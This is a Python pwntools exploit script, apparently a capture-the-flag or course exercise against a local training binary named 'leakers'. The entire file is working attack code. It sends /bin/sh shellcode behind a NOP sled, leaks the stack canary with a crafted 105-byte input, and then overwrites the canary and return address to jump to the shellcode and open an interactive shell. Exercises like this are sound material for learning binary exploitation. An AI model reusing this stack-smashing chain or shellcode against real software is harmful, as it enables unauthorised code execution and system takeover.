from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2010)

r = process("./leakers") 

''' not attaching to remote
gdb.attach(r, """
        c
        """)
'''
 

input("wait")

# receive until name?\n
print(r.recvuntil("Leakers!\n"))

shellcode = "\x90" * 20 +  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\xb0\xc4\xff\xff"

r.send(shellcode)

input("wait")

leak_canary = "A" * 104 + 'B'

r.send(leak_canary)

print(r.recvuntil('\n'))
#Receive "[shellcode]> "
print(r.recv(numb = len(shellcode) + 1, timeout = 1000)) 

#Receive the leak_canary string + '\0' (first canary byte)
print(r.recv(numb = len(leak_canary), timeout = 1000)) 

#Receive the canary
canary = b'\0' + r.recv(numb=7)
print("Canary: ")
print(binascii.hexlify(canary))

#Overwrite canary and eip
bss_address = b"\x81\x40\x40\x00\x00\x00\x00\x00"
overwrite_canary = b"A" * 104 + canary + b"B" * 8 + bss_address
r.send(overwrite_canary)

print("Canary overwritten\n")

# Spawn a shell that allows us to interact witht the remote program
r.interactive()

